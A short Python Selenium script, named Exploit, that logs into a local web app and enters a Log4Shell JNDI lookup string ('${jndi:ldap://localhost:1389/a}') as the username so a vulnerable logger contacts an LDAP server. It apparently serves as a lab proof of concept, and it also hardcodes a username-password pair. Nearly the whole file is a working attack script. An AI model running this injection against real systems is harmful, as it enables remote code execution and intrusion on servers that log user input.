from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os


class Exploit():
	def __init__(self):
		self.driver = webdriver.Chrome(os.getcwd()+"/chromedriver")
		self.driver.get("http:localhost:8080")

	def run(self):
		self.login(uname="${jndi:ldap://localhost:1389/a}",pwd="00000000")
		self.driver.close()

	def login(self,uname,pwd):	
		self.driver.get("http:localhost:8080/login.jsp")
		username = WebDriverWait(self.driver, 10).until(
			EC.presence_of_element_located((By.NAME, "username"))
		)
		password = WebDriverWait(self.driver, 10).until(
			EC.presence_of_element_located((By.NAME, "password"))
		)
		login_button = WebDriverWait(self.driver, 10).until(
			EC.presence_of_element_located((By.XPATH, "/html/body/form/input[3]"))
		)
		username.clear()
		password.clear()
		username.send_keys(uname)
		password.send_keys(pwd)
		login_button.click()

		if(uname=="pigman0315" and pwd=="04383129"):
			self.is_login = True
		else:
			self.is_login = False

	def backward(self):
		self.driver.back()

	def forward(self):
		self.driver.forward()


if(__name__ == '__main__'):
	exploit = Exploit()
	exploit.run()
